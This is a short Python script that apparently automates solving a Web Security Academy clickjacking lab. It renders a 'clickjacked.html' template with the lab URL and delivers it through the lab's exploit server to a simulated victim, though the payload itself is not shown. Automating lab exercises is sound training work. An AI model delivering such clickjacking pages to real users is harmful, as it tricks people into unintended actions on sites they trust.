from web_security_academy.core.utils import render_template_file
from web_security_academy.core.logger import logger


def solve_lab(session):
    payload = render_template_file("clickjacked.html", url=session.url)
    session.exploit_server().deliver_exploit_to_victim(
        "/exploit", "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8", payload
    )
